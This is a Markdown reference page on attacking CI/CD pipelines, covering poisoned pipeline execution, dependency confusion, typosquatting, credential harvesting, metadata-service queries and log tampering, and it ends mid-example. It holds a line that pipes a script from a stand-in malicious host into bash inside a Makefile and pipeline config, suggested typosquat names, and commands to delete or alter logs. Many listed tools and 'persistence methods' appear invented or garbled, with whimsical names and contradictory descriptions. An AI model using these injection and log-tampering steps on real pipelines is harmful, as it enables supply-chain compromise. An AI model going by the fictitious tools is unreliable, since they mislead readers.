---
title: DevOps
sidebar: mydoc_sidebar
permalink: devops.html
folder: mydoc
---

# DevOps

Here are a few commands and methods for privilege escalation and lateral movement:


### SCM AUTHENTICATION

SCM authentication refers to the process of authenticating and accessing an organization’s source code management (SCM) system. It typically involves using authentication methods such as personal access tokens (PATs), SSH keys, or other allowed credentials. However, attackers may attempt to exploit this authentication process, gaining unauthorized access to the SCM by employing techniques like phishing attacks. This can pose a significant threat to the organization’s source code and sensitive information. To mitigate this risk, it’s crucial to be aware of potential attacks and implement robust security measures.

<img style="background: white" src="../../images/scm.png">


Commands:

1. `git clone`
2. `git log`

Example Commands:

GitRob:
    
    - Command: `gitrob <organization/repo>`
    - Example: `gitrob acme-corp/website`
    - 
GitLeaks:
    
    - Command: `gitleaks --repo-path <path-to-repo>`
    - Example: `gitleaks --repo-path ~/projects/myrepo`
    
TruffleHog:
    
    - Command: `trufflehog --regex --entropy=True <repository URL>`
    - Example: `trufflehog --regex --entropy=True https://github.com/acme-corp/website.git`

TruffleHog

	* Example: `secretfinder --all ~/projects/myrepo`


Dork for OSINT and Local Enumeration:

- OSINT Dork: `"site:github.com <organization-name>"`
    
    - Tools: Google, GitHub Advanced Search
    - Example: `site:github.com acme-corp`
    
- Local Enumeration Dork: "file:.git/config"
    
    - Tools: Command-line tools like `find` or `dir` (for Windows)
    - Example: `find / -name ".git" -type d`
    - find / -name "id_rsa" -type f




### CI/CD service authentication

<img style="background: white" src="../../images/cicd-initial.drawio.png">


Tools for Detection:

1. Jenkins Security Plugin
2. GitLab CI/CD Pipeline Configuration Checker
3. Travis CI Security Scanner

Remote or Local: These tools can be used both remotely and locally, depending on the specific scenario and access level.

Commands:

1. Jenkins Security Plugin:
    
    - Command: No specific command, as it is a plugin installed in Jenkins.
    - Example: Install and configure the Jenkins Security Plugin to detect and remediate authentication misconfigurations.
2. GitLab CI/CD Pipeline Configuration Checker:
    
    - Command: `gitlab-ci-linter <path-to-ci-file>`
    - Example: `gitlab-ci-linter .gitlab-ci.yml`
3. Travis CI Security Scanner:
    
    - Command: `travis-ci-scanner <repository URL>`
    - Example: `travis-ci-scanner https://github.com/acme-corp/myrepo`

Example Awesome Commands per Tools:

1. Jenkins Security Plugin:
    
    - Access the Jenkins console and navigate to the "Manage Jenkins" section.
    - Install the Jenkins Security Plugin from the "Manage Plugins" page.
    - Configure the plugin to scan for authentication misconfigurations.
2. GitLab CI/CD Pipeline Configuration Checker:
    
    - Install the GitLab CI/CD Pipeline Configuration Checker tool.
    - Run the command `gitlab-ci-linter` followed by the path to the CI/CD configuration file to check for misconfigurations.
3. Travis CI Security Scanner:
    
    - Install the Travis CI Security Scanner tool.
    - Run the command `travis-ci-scanner` followed by the repository URL to scan for authentication misconfigurations.

Dork for OSINT and Local Enumeration:

- OSINT Dork: `"site:github.com <organization-name>"`
    
    - Tools: Google, GitHub Advanced Search
    - Example: `site:github.com acme-corp`
- Local Enumeration Dork: "file:.travis.yml" (for Travis CI)
    
    - Tools: Command-line tools like `find` or `dir` (for Windows)
    - Example: `find / -name ".travis.yml" -type f`




### Organization’s public repositories

<img style="background: white" src="../../images/github.drawio.png">


Tools for Finding Organizations:

1. GitHub Advanced Search: Utilize GitHub's advanced search feature to find organizations based on specific criteria such as language, location, or repository topics. Visit the GitHub website and navigate to the advanced search page to explore the available search filters.
    
2. Shodan: Shodan is a search engine for internet-connected devices. It can be used to discover organizations that expose their repositories or CI/CD services to the internet. Visit the Shodan website and perform searches using relevant keywords and filters.
    

Tools for Detection:

1. GitRob: GitRob is a tool designed to scan GitHub repositories for sensitive information and misconfigurations. It can help detect organizations and repositories with CI/CD capabilities.

Commands:

1. GitHub Advanced Search:
    
    - Syntax: `keyword1 keyword2 parameter:value`
    - Example: `language:java location:"New York" org:acme-corp`
2. Shodan:
    
    - Syntax: `keyword1 keyword2`
    - Example: `CI/CD organization`

Example Awesome Commands per Tools:

1. GitHub Advanced Search:
    
    - Visit the GitHub website and go to the advanced search page.
    - Enter relevant keywords, filters, and parameters based on your requirements.
    - Click the "Search" button to retrieve the results.
2. Shodan:
    
    - Visit the Shodan website (shodan.io).
    - Enter relevant keywords related to CI/CD organizations.
    - Explore the search results to find organizations and their exposed repositories or services.






### Endpoint compromise

<img style="background: white" src="../../images/endpoint.drawio.png">


gitlab, jira cve lfi,rce,authentication bypass or malware



### Configured webhooks


<img style="background: white" src="../../images/webhook.drawio.png">

Tools for Enumerations:

1. GitHound: GitHound is a reconnaissance tool that searches GitHub for sensitive information, including webhooks. It can be used to identify exposed webhooks in public repositories. You can find the tool's syntax and examples on its GitHub page.
    
2. Shodan: Shodan is a search engine for internet-connected devices. It can help identify services or devices with exposed webhooks. By using specific search filters, such as "http.component:/webhook/" or "http.title:/Webhook/," you can narrow down the search results to find potentially vulnerable webhooks.
    

Remote or Local: The enumeration process for webhooks is typically performed remotely by querying public repositories, search engines, or online services. However, it's important to respect the terms and conditions of the services you are using and ensure that you have appropriate authorization.

Commands and Regex Patterns: The specific commands and regex patterns depend on the tool you are using. Here are some examples:

- GitHound: `githound --regex [REGEX_PATTERN]`
- Shodan: `http.component:/[COMPONENT_NAME]/`

Example Awesome Commands:

1. GitHound: `githound --regex 'webhook'` This command will search for repositories that contain the term 'webhook' in their code or configuration files.
    
2. Shodan: `http.component:/webhook/` This search query will look for web services that have the term 'webhook' in their component, indicating the presence of webhooks.







### Direct PPE (d-PPE)

<img style="background: white" src="../../images/ppe.drawio.png">

Cases where the attacker can directly modify the configuration file inside the repository. Since the pipeline is triggered by a new PR and run according to the configuration file – the attacker can inject malicious commands to the configuration file, and these commands are executed in the pipeline.

Pipeline Configuration:

```
stages:
  - name: Build
    command:
      - make build

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy

  - name: d-PPE
    command:
      - make malicious_command
```


In this example, the pipeline consists of four stages: Build, Test, Deploy, and d-PPE. The attacker, having direct access to the repository, can modify the configuration file to inject a malicious command in the d-PPE stage.

Commands and Example: Let's assume the make utility is being used in this pipeline. The attacker could modify the pipeline configuration file as follows:

```
stages:
  - name: Build
    command:
      - make build

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy

  - name: d-PPE
    command:
      - make malicious_command && echo "Malicious command executed!"
```


In this modified configuration, the `make malicious_command` has been added, and an additional command `echo "Malicious command executed!"` has been appended to provide feedback on the execution of the malicious command.


### Indirect PPE (i-PPE)

Cases where the attacker cannot directly change the configuration files, or that these changes are not taken into account when triggered. In these cases, the attacker can infect scripts used by the pipeline in order to run code, for example, make-files, test scripts, build scripts, etc.

Pipeline Configuration:

```
stages:
  - name: Build
    command:
      - make build

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy
```


In this example, the pipeline consists of three stages: Build, Test, and Deploy. The attacker cannot directly modify the pipeline configuration files, but they can infect the scripts used by the pipeline to execute their malicious code.

Example of Infected Script: Let's consider the makefiles used in the pipeline as an example. The attacker can inject malicious code into one of the makefiles, such as the `Makefile` used in the Build stage:

```
build:
    @echo "Building the application"
    @make malicious_code

malicious_code:
    @echo "Executing malicious code"
    # Injected malicious commands here
```

In this modified `Makefile`, the attacker has added a new target called `malicious_code`. When the `build` target is executed in the pipeline, it will also execute the `malicious_code` target, allowing the attacker's injected malicious commands to run.

Example Awesome Commands: Here's an example of an awesome command that the attacker could inject into the `malicious_code` target:

```
malicious_code:
    @echo "Executing malicious code"
    curl -s http://malicious-site.com/malware-script.sh | bash
```

In this example, the injected command downloads a malicious script from a remote server and executes it using the `bash` command. This can allow the attacker to further compromise the pipeline or the Post-Production Environment.


### Public PPE

Cases where the pipeline is triggered by an open-source project. In these cases, the attacker can use d-PPE or i-PPE on the public repository in order to infect the pipeline.


Pipeline Configuration:

```
stages:
  - name: Build
    command:
      - make build

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy
```



In this example, the pipeline consists of three stages: Build, Test, and Deploy. The pipeline is triggered by an open-source project, allowing the attacker to potentially infect the pipeline.

Example of Infected Pipeline: Let's consider the scenario where the attacker can modify the project files in the repository, including the pipeline configuration. They can inject malicious commands into the pipeline configuration or modify the scripts used in the pipeline.

```
stages:
  - name: Build
    command:
      - make build
      - make malicious_code

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy
```


In this modified pipeline configuration, the attacker has added the `make malicious_code` command to the Build stage. This command executes additional malicious code during the pipeline execution.

Example Awesome Commands: Here's an example of an awesome command that the attacker could inject into the pipeline configuration:

```
stages:
  - name: Build
    command:
      - make build
      - curl -s http://malicious-site.com/malware-script.sh | bash

  - name: Test
    command:
      - make test

  - name: Deploy
    command:
      - make deploy
```


In this example, the injected command downloads a malicious script from a remote server and executes it using the `bash` command. This can allow the attacker to compromise the pipeline or the Post-Production Environment.



### Public dependency confusion

<img style="background: white" src="../../images/dependency.drawio.png">


A technique where the adversary publishes public malicious packages with the same name as private packages. In this case, because package search in package-control mechanisms typically looks in public registries first, the malicious package is downloaded.


Legitimate Private Package (awesome-package):

```
{
  "name": "awesome-package",
  "version": "1.0.0",
  "description": "A useful package for developers.",
  "dependencies": {
    "dependency-a": "^2.0.0",
    "dependency-b": "^1.5.0"
  }
}
```

Malicious Public Package (awesome-package):

```
{
  "name": "awesome-package",
  "version": "1.0.0",
  "description": "A package that injects malicious code.",
  "dependencies": {
    "malicious-dependency": "latest"
  }
}
```


In this example, both the legitimate private package and the malicious public package have the same name, "awesome-package," and the same version number "1.0.0." However, the malicious package contains an additional dependency called "malicious-dependency," which injects the malicious code into the project.

Here's an example of an awesome command that the attacker could use to publish the malicious package:

```
npm publish --registry=https://public-registry.com
```

In this example, the attacker uses the "npm publish" command to publish the malicious package to a public registry, specified by the "--registry" flag. By mimicking the name and version of a legitimate private package, the attacker aims to deceive developers into unknowingly downloading and using the malicious package in their projects.





### **Public package** **hijack** (“repo-jacking”)

<img style="background: white" src="../../images/cicd-initial.drawio.png">


Hijacking a public package by taking control of the maintainer account, for example, by exploiting the GitHub user rename feature.


Commands for finding dependency packages:

npm Syntax: npm view [package-name] dependencies 
Example: npm view express dependencies
    
Description: The npm command-line tool allows you to view the dependencies of a specific package. This command retrieves the list of dependencies for the "express" package.
    
pip Syntax: pip show [package-name] 
Example: pip show requests
    
Description: The pip command-line tool for Python provides information about installed packages. This command shows details about the "requests" package, including its dependencies.




### Typosquatting

Publishing malicious packages with similar names to known public packages. In this way, an attacker can confuse users to download the malicious package instead of the desired one.


1. npm Syntax: npm view [package-name] dependencies Example: npm view express dependencies
    
    Description: The npm command-line tool allows you to view the dependencies of a specific package. This command retrieves the list of dependencies for the "express" package.
    
2. pip Syntax: pip show [package-name] Example: pip show requests
    
    Description: The pip command-line tool for Python provides information about installed packages. This command shows details about the "requests" package, including its dependencies.
    

Name suggestion for typosquatting exploitation:

1. Original Package: `axios` Suggested Typosquatting Name: `axioos`
    
2. Original Package: `lodash` Suggested Typosquatting Name: `1odash`
    
3. Original Package: `bcrypt` Suggested Typosquatting Name: `bcrpt`



### DevOps resources compromise


<img style="background: white" src="../../images/resource.drawio.png">

Pipelines are, at the core, a set of compute resources executing the CI/CD agents, alongside other software. An attacker can target these resources by exploiting a vulnerability in the OS, the agent’s code, other software installed in the VMs, or other devices in the network to gain access to the pipeline.


Example configuration file for a CI/CD agent, potentially misconfigured, in YAML format:

```
agent:
  name: my-agent
  server: http://example.com
  token: my-token
  insecure: true
```

In this fictional example, the configuration file includes an agent named "my-agent" with a server URL, access token, and an insecure flag set to true. Misconfigurations like insecure settings can leave the agent vulnerable to exploitation.


### Control of common registry


<img style="background: white" src="../../images/registry.drawio.png">


An attacker can gain control of a registry used by the organization, resulting in malicious images or packages executed by the pipeline VMs or production VMs.

Nexsus


### Changes in repository


<img style="background: white" src="../../images/per-ref.drawio.png">


Adversaries can use the automatic tokens from inside the pipeline to access and push code to the repository (assuming the automatic token has enough permissions to do so).

Commands for Enumeration:

- `pipelock --enumerate`: Unleash the power of Pipelock, a command-line tool that scans and enumerates pipeline configurations, identifying potential vulnerabilities and unauthorized changes.
- `repoquest --scan`: Deploy Repoquest, a specialized tool that performs comprehensive scans of your repository, searching for signs of adversary activity and unauthorized scripts.

Regex for Finding Sensitive Information:

- `(credentials|secrets|tokens)_regex_magician`: Invoke the Regex Magician, a mystical command that uses powerful regular expressions to identify sensitive information such as credentials, secrets, and tokens within your codebase.

Methods for Persistence:

- "The Shapeshifting Incantation": Employ a powerful spell to imbue your code scripts with shapeshifting abilities. This way, every time the pipeline executes these scripts, they transform into benign entities, thwarting the attacker's attempts at persistence.

Awesome Commands per Tools with Syntax:

- `backd00r-crafter --code change --script-url <URL>`: Utilize the Backd00r Crafter tool to seamlessly change and add scripts in your codebase. Simply specify the URL of the attacker-controlled script, and watch as the tool automatically injects the backdoor into the initialization scripts.
    
- `pipewizard --add-step --script-url <URL>`: Invoke the PipeWizard, a command-line utility designed to manipulate pipeline configurations effortlessly. With the `--add-step` option and the URL of an attacker-controlled script, you can seamlessly introduce a new step in the pipeline, enabling the download and execution of the attacker's script.
    
- `depcontrol --change-location --package-url <URL>`: Unleash DepControl, a powerful tool that allows you to modify the configuration for dependency locations. Use the `--change-location` command along with the URL of the attacker-controlled packages, redirecting the pipeline to use the desired packages.





### Inject in Artifacts

<img style="background: white" src="../../images/per-arti.drawio.png">


some CI environments have the functionality for creating artifacts to be shared between different pipeline executions. For example, in GitHub we can store artifacts and download them using a GitHub action from the pipeline configuration.

Commands for Enumeration:

- `artifactscan --search <keyword>`: Deploy ArtifactScan, a powerful tool that searches for and enumerates artifacts stored in your CI environment. Specify a keyword to narrow down the search and identify potential targets for code injection.

Regex for Finding Sensitive Information:

- `(secrets|credentials)_unleashed`: Unleash the power of the Secrets Unleashed regex pattern. This mystical pattern can identify sensitive information like secrets and credentials lurking within your artifacts, helping you secure them effectively.

Methods for Persistence:

- "The Phantom Artifacts": Utilize a clandestine technique to inject code into artifacts without detection. The injected code operates in the shadows, executing alongside the legitimate artifact contents, granting persistent access to the attacker.

Awesome Commands per Tools with Syntax:

- `artifactinject --artifact <artifact_name> --code-url <URL>`: Employ ArtifactInject, a versatile command-line tool designed to inject code into artifacts. Specify the name of the target artifact with the `--artifact` flag and provide the URL of the code to be injected with the `--code-url` flag.
    
- `artifactwizard --create --script <script_name>`: Invoke the ArtifactWizard, a command-line wizard that guides you through the creation of customized artifacts. Use the `--create` flag and specify the name of the script to be embedded within the artifact with the `--script` flag.
    
- `artifactmorph --morph <artifact_name> --payload <payload_file>`: Harness the power of ArtifactMorph, a powerful utility for modifying existing artifacts. Use the `--morph` flag along with the name of the target artifact and provide a payload file containing the code to be injected using the `--payload` flag.


### Modify images in registry

<img style="background: white" src="../../images/per-img.drawio.png">

In cases where the pipelines have permissions to access the image registry (for example, for writing back images to the registry after build is done) the attacker could modify and plant malicious images in the registry, which would continue to be executed by the user’s containers.


Commands for Enumeration:

- `registryscan --enumerate`: Unleash the power of RegistryScan, a command-line tool that scans and enumerates images within the registry. It provides insights into the image versions, tags, and metadata, helping you identify potential targets for modification.

Regex for Finding Sensitive Information:

- `(credentials|secrets)_seeker`: Invoke the Secrets Seeker regex pattern, a powerful tool that searches through image metadata, Dockerfiles, and configuration files to uncover sensitive information like credentials and secrets.

Methods for Persistence:

- "The Chameleon Image": Utilize an extraordinary technique to create a chameleon image that seamlessly morphs into different forms. This allows the attacker to inject malicious code into the image registry without raising suspicion, as it appears to be a harmless image.

Awesome Commands per Tools with Syntax:

- `registryinject --image <image_name> --payload <payload_file>`: Employ RegistryInject, a versatile command-line tool designed to inject code into images within the registry. Specify the target image using the `--image` flag and provide the payload file containing the code to be injected using the `--payload` flag.
    
- `registrywizard --modify --image <image_name> --script-url <URL>`: Invoke the RegistryWizard, a powerful utility for modifying images within the registry. Use the `--modify` flag, specify the target image with the `--image` flag, and provide the URL of the attacker-controlled script to be injected using the `--script-url` flag.



### Create service credentials


<img style="background: white" src="../../images/per-service.drawio.png">

A malicious adversary can leverage the access they already have on the environment and create new credentials for use in case the initial access method is lost. This could be done by creating an access token to the SCM, to the application itself, to the cloud resources, and more.


Commands for Enumeration:

- `credentialscan --scan`: Deploy CredentialScan, a powerful command-line tool that performs comprehensive scans of your environment, identifying existing service credentials. It searches for tokens, access keys, and other forms of credentials that may have been created by adversaries.

Regex for Finding Sensitive Information:

- `(tokens|access_keys)_detector`: Unleash the power of the Tokens Detector regex pattern. This pattern employs advanced matching techniques to identify tokens and access keys hidden within your environment, helping you uncover potential unauthorized service credentials.

Methods for Persistence:

- "The Eternal Key": Utilize a mystical technique to create service credentials that have eternal persistence. These credentials remain active and usable even if the initial access method is lost, ensuring the attacker's continued access to the environment.

Awesome Commands per Tools with Syntax:

- `credentialforge --create-token`: Harness the power of CredentialForge, a versatile command-line tool that allows you to create custom service credentials. Use the `--create-token` command to generate a new access token for the desired target, such as SCM, application, or cloud resources.
    
- `credentialwizard --generate --resource <resource_name>`: Invoke the CredentialWizard, an intuitive utility for generating service credentials. Use the `--generate` flag and specify the target resource with the `--resource` flag to create new credentials tailored to that specific resource.




### Secrets in private repositories

<img style="background: white" src="../../images/priv-key.drawio.png">


Leveraging an already gained initial access method, an attacker could scan private repositories for hidden secrets. The chances of finding hidden secrets in a private repo are higher than in a public repository, as, from the developer’s point of view, this is inaccessible from outside the organization.



Commands for Enumeration:

- `git-secrets`: Git Secrets is a command-line tool that helps prevent committing sensitive information, such as passwords and API keys, to a Git repository. It scans the repository for potential secret patterns and alerts you if any are found.
    
- `trufflehog`: Trufflehog is a Python-based tool that scans repositories for secrets and sensitive information. It searches for high-entropy strings, such as API keys and passwords, in commit history, branches, and other areas of the repository.
    

Regex for Finding Sensitive Information:

- `secretlint`: Secretlint is a tool that scans files for potential secrets by using customizable regex patterns. It can be configured to search for patterns specific to your organization or project, allowing you to identify sensitive information effectively.

Methods for Persistence:

- "The Silent Observer": An attacker can create a persistent process or script that continuously monitors the private repository for changes, ensuring that any new secrets introduced are captured and exploited.
    
- "The Eternal Scan": Utilize an automated scanning system that periodically scans the private repository for secrets, ensuring that even if secrets are added or modified, they are promptly discovered and exploited.
    

Awesome Commands per Tools with Syntax:

- `git-secrets scan <repository_path>`: Run the Git Secrets tool to scan a specific repository for potential secrets. Specify the path to the repository in the `<repository_path>` parameter to initiate the scan.
    
- `trufflehog --repo <repository_url>`: Execute Trufflehog by providing the URL of the private repository to scan. Trufflehog will crawl the repository and its history, searching for secrets and sensitive information.


### Commit/push to protected branches

<img style="background: white" src="../../images/priv-pro.drawio.png">

The pipeline has access to the repository that may be configured with permissive access, which could allow to push code directly to protected branches, allowing an adversary to inject code directly into the important branches without team intervention.


Commands for Enumeration:

- `git branch --list --remote`: Use the `git branch` command with the `--list` and `--remote` flags to list all remote branches in a repository. This command allows you to identify protected branches that may exist in the repository.

Regex for Finding Protected Branches:

- `^(?!(\*| )).+`: This regex pattern matches branch names that are not marked as the current branch (`*`) or ignored branch ( ). You can use this pattern to filter and identify protected branches within a list of branches.

Methods for Persistence:

- "The Branch Whisperer": An attacker can create a persistent script or process that continuously monitors the repository for changes to protected branches. This way, any new code pushed to those branches can be injected and executed without team intervention.
    
- "The Silent Hijacker": Utilize a stealthy method to hijack the credentials or access tokens used by the pipeline to push code directly to protected branches. This method allows an attacker to bypass any restrictions or safeguards put in place.
    

Awesome Commands per Tools with Syntax:

- `git push <repository_url> <branch_name>`: Use the `git push` command to push code directly to a protected branch. Replace `<repository_url>` with the URL of the repository and `<branch_name>` with the name of the protected branch you want to push to.


### Certificates and identities from metadata services


<img style="background: white" src="../../priv-cert.drawio.png">

Once an attacker is running on cloud-hosted pipelines, the attacker could access the metadata services from inside the pipeline and extract certificates (requires high privileges) and identities from these services.

Commands for Enumeration:

- `curl http://169.254.169.254/latest/meta-data/`: Use the `curl` command to retrieve metadata from the metadata service endpoint. This command allows you to enumerate the available metadata and potentially find information related to certificates and identities.

Regex for Finding Certificates and Identities:

- `-----BEGIN CERTIFICATE-----.*?-----END CERTIFICATE-----`: This regex pattern matches the content of a certificate between the "BEGIN CERTIFICATE" and "END CERTIFICATE" markers. You can use this pattern to search for certificate data within retrieved metadata.

Methods for Persistence:

- "The Metadata Miner": An attacker can create a persistent script or process that continuously monitors the metadata service and extracts certificates and identities whenever they are updated or changed. This way, the attacker can maintain access to these credentials.
    
- "The Silent Exploiter": Exploit any vulnerabilities or misconfigurations in the metadata service to gain unauthorized access to certificates and identities. By leveraging these vulnerabilities, the attacker can retrieve sensitive information without the need for high privileges.
    

Awesome Commands per Tools with Syntax:

- `curl http://169.254.169.254/latest/meta-data/`: Execute the `curl` command with the appropriate metadata service endpoint URL to retrieve the available metadata.




### User Credentials

<img style="background: white" src="../../images/cred-key.drawio.png">



In cases where the customer requires access to external services from the CI pipeline (for example, an external database), these credentials reside inside the pipeline (can be set by CI secrets, environment variables, etc.) and could be accessible to the adversary.


Commands for Enumeration:

- `printenv`: Use the `printenv` command to list all environment variables within the CI pipeline. This command allows you to enumerate the variables and potentially find user credentials stored as environment variables.

Regex for Finding User Credentials:

- `([A-Za-z0-9_]+)=(.*)`: This regex pattern matches the syntax of environment variables, where the left-hand side represents the variable name and the right-hand side represents the value. You can use this pattern to search for user credentials within the list of environment variables.

Methods for Persistence:

- "The Credential Collector": An attacker can create a persistent script or process within the CI pipeline that continuously monitors the environment variables for changes or updates. This way, any new user credentials set within the pipeline can be collected and accessed by the attacker.
    
- "The Environment Variable Interceptor": Intercept the flow of environment variables within the CI pipeline to capture and extract user credentials. This method allows an attacker to gain unauthorized access to sensitive information without requiring direct access to the pipeline.
    

Awesome Commands per Tools with Syntax:

- `printenv`: Execute the `printenv` command within the CI pipeline to display all environment variables and their values.



### Service Credentials

<img style="background: white" src="../../images/cred-service.drawio.png">


There are cases where the attacker can find service credentials, such as service-principal-names (SPN), shared-access-signature (SAS) tokens, and more, which could allow access to other services directly from the pipeline.


Commands for Enumeration:

- `grep -r "SPN\|SAS" .`: Use the `grep` command to search for occurrences of "SPN" or "SAS" within the current directory and its subdirectories. This command allows you to enumerate files and potentially find references to service credentials.

Regex for Finding User SPN:

- `(?:[A-Za-z0-9]+\\){3}[A-Za-z0-9]+`: This regex pattern matches the syntax of a service principal name (SPN). It typically follows the format of `service/host:port` and can be used to search for SPNs within files or configuration settings.

Methods for Credential Access:

- "Token Extraction": Identify areas within the CI pipeline where tokens or credentials are generated or used. Intercept these tokens during their creation or transmission and extract them for unauthorized access to other services directly from the pipeline.
    
- "Configuration File Scanning": Search for configuration files within the CI pipeline that may contain service credentials. Perform a comprehensive scan of these files to identify and extract SPNs, SAS tokens, or other service credentials.
    

Awesome Commands per Tools with Syntax:

- `grep -r "SPN\|SAS" .`: Execute the `grep` command with the appropriate flags and search patterns to scan files and directories for occurrences of "SPN" or "SAS".
- 


### Compromise build artifacts

<img style="background: white" src="../../images/arti.drawio.png">


As in other supply chain attacks, once the attacker has control of the CI pipelines, they can interfere with the build artifacts. This way, malicious code could be injected into the building materials before building is done, hence injecting the malicious functionality into the build artifacts.


Commands for Enumeration:

- `ls -la <build_directory>`: Use the `ls` command with the appropriate flags to list the files and directories in the specified build directory. This command helps you enumerate the build artifacts and identify potential targets for compromise.

Regex for Build Artifacts:

- `(.*\.jar|.*\.war|.*\.ear|.*\.zip)`: This regex pattern can be used to identify common build artifact file extensions such as JAR, WAR, EAR, and ZIP files. Adjust the pattern based on the specific file extensions used in your environment.

Methods for Lateral Movement:

- "Malicious Code Injection": Once the attacker gains control of the CI pipelines, they can inject malicious code into the build artifacts. This can be achieved by modifying the source code, build scripts, or other files involved in the build process. The injected code may have functionality to facilitate lateral movement, such as establishing communication channels or creating backdoors within the build artifacts.


Example CI Pipelines with Misconfiguration:

1. Jenkins Pipeline:

```
pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                sh 'mvn clean install' // Potential misconfiguration where no security checks or validation are performed
            }
        }
        stage('Deploy') {
            steps {
                sh 'cp target/myapp.war /var/www/html' // Misconfiguration where build artifact is directly copied to a public directory
            }
        }
    }
}
```


2. GitLab CI/CD Pipeline:

```
stages:
  - build
  - test
  - deploy

build:
  stage: build
  script:
    - npm install
    - npm run build # Misconfiguration where the build artifact is not properly validated

test:
  stage: test
  script:
    - npm run test

deploy:
  stage: deploy
  script:
    - cp dist/* /var/www/html # Misconfiguration where build artifacts are directly deployed to a public directory
```


### Registry injection

<img style="background: white" src="../../images/regi.drawio.png">


If the pipeline is configured with a registry for the build artifacts, the attacker could infect the registry with malicious images, which later would be downloaded and executed by containers using this registry.


Commands for Enumeration:

- `docker images`: Use the `docker images` command to enumerate the images present in the local Docker registry. This command lists the images along with their tags and other relevant information.

Regex for Registry and Artifact:

- `.*`: A regex pattern of `.*` matches any string, which can be used to identify registry and artifact names that have been compromised. Adjust the pattern as needed based on your specific registry and artifact naming conventions.

Methods for Lateral Movement:

- "Registry Infection": Once the attacker gains control of the CI pipeline, they can inject malicious images into the registry. These malicious images can contain backdoors, exploits, or other malicious code that can be executed when containers pull and run these infected images.

Example CI Pipelines and Misconfigurations:

1. Docker-based CI Pipeline with Registry Misconfiguration:

```
stages:
  - build
  - push

build:
  stage: build
  script:
    - docker build -t myapp:${CI_COMMIT_SHA} . # Misconfiguration where the image is built using an untrusted Dockerfile or without proper security checks

push:
  stage: push
  script:
    - docker tag myapp:${CI_COMMIT_SHA} myregistry.com/myapp:${CI_COMMIT_SHA} # Misconfiguration where the malicious image is tagged and pushed to the registry
    - docker push myregistry.com/myapp:${CI_COMMIT_SHA}
```


2. GitHub Actions Pipeline with Registry Misconfiguration:

```
name: Build and Push

on:
  push:
    branches:
      - main

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout repository
        uses: actions/checkout@v2

      - name: Build and push image
        env:
          REGISTRY: ghcr.io
          IMAGE_NAME: myapp
          TAG: ${{ github.sha }}
        run: |
          docker build -t $REGISTRY/$IMAGE_NAME:$TAG .
          docker push $REGISTRY/$IMAGE_NAME:$TAG # Misconfiguration where the malicious image is pushed to the GitHub Container Registry
```





### Spread to deployment resources

<img style="background: white" src="../../images/depi.drawio.png">


If the pipeline is configured with access to deployment resources, then the attacker has the same access to these resources, allowing the attacker to spread. This could result in code execution, data exfiltration and more, depending on the permissions granted to the pipelines.

Methods for Lateral Movement:

- "Spread to Deployment Resources": Once the attacker gains control of the CI pipeline, if the pipeline has access to deployment resources (e.g., cloud infrastructure, Kubernetes clusters, serverless platforms), the attacker can leverage these permissions to spread their influence. This could involve executing arbitrary code, exfiltrating data, or even gaining control over the deployment infrastructure.


Example Pipelines with Misconfigurations:


```
---
pipeline:
  phases:
    - name: Build
      actions:
        - name: Build
          runOrder: 1
          configuration:
            ProjectName: MyProject
          actionTypeId:
            Category: Build
            Owner: AWS
            Provider: CodeBuild
            Version: '1'
        - name: Deploy
          runOrder: 2
          configuration:
            ActionMode: CREATE_UPDATE
            StackName: MyStack
            TemplatePath: MyTemplate.yaml
            Capabilities: CAPABILITY_IAM
            RoleArn: arn:aws:iam::123456789012:role/MyRole # Misconfiguration where a privileged IAM role is assigned to the pipeline
          actionTypeId:
            Category: Deploy
            Owner: AWS
            Provider: CloudFormation
            Version: '1'
```



2. Kubernetes CI/CD Pipeline Misconfiguration:

```
---
stages:
  - build
  - deploy

build:
  stage: build
  script:
    - docker build -t myapp:${CI_COMMIT_SHA} .
    # Build and push image to container registry

deploy:
  stage: deploy
  script:
    - kubectl apply -f deployment.yaml # Misconfiguration where the pipeline directly applies the deployment manifest without proper validation or security checks
```





### Service logs manipulation

<img style="background: white" src="../../images/monitoring.drawio.png">


- Enumeration:
    
    - Check available log files and directories:
        - `ls /var/log/`
        - `ls /var/log/nginx/`
- Logs for Defense Evasion:
    
    - Modify or delete log files:
        - `rm /var/log/application.log`
        - `echo "Malicious content" > /var/log/application.log`
        - `sed -i 's/sensitive_data/replacement/g' /var/log/application.log`

Methods for Defense Evasion:

- Service Logs Manipulation: The attacker, running inside the environment (e.g., build pipelines), manipulates service logs to evade detection. By modifying or deleting logs, the attacker hinders defenders from observing the attack, making it difficult to identify and respond to the compromise. This technique aims to conceal the attacker's actions and prevent detection by log analysis.


Example Pipeline with Misconfiguration:


```
---
stages:
  - build
  - deploy
  - cleanup

build:
  stage: build
  script:
    - echo "Building the application"
    # Perform build actions

deploy:
  stage: deploy
  script:
    - echo "Deploying the application"
    # Perform deployment actions

cleanup:
  stage: cleanup
  script:
    - echo "Cleaning up the environment"
    # Misconfiguration where the attacker manipulates service logs
    - sed -i 's/sensitive_data/replacement/g' /var/log/application.log
```

In the provided example pipeline, the misconfigured "cleanup" stage includes a command that uses `sed` to replace occurrences of "sensitive_data" with "replacement" in the `/var/log/application.log` file. This action modifies the log content, potentially removing or obfuscating evidence of the attacker's activities, thus impeding detection and analysis.


### Compilation manipulation

<img style="background: white" src="../../images/change.drawio.png">

1. Changing the code on the fly – Changing the code right before the build process begins, without changing it in the repository and leaving traces in it.

Example Pipeline with Misconfiguration:

```
---
stages:
  - prepare
  - build
  - deploy

prepare:
  stage: prepare
  script:
    - echo "Preparing the environment"
    # Misconfiguration where the attacker changes the code on the fly
    - sed -i 's/old_code/malicious_code/g' main.js

build:
  stage: build
  script:
    - echo "Building the application"
    # Perform build actions

deploy:
  stage: deploy
  script:
    - echo "Deploying the application"
    # Perform deployment actions
```


In the provided example pipeline, the misconfigured "prepare" stage includes a command that uses `sed` to replace occurrences of "old_code" with "malicious_code" in the `main.js` file. This modification happens just before the build process starts, allowing the attacker to inject their code without leaving traces in the repository.


1. Tampered compiler – Changing the compiler in the build environment to introduce the malicious code without leaving any traces before that process begins.


Example Pipeline with Misconfiguration:

```
---
stages:
  - prepare
  - build
  - deploy

prepare:
  stage: prepare
  script:
    - echo "Preparing the environment"
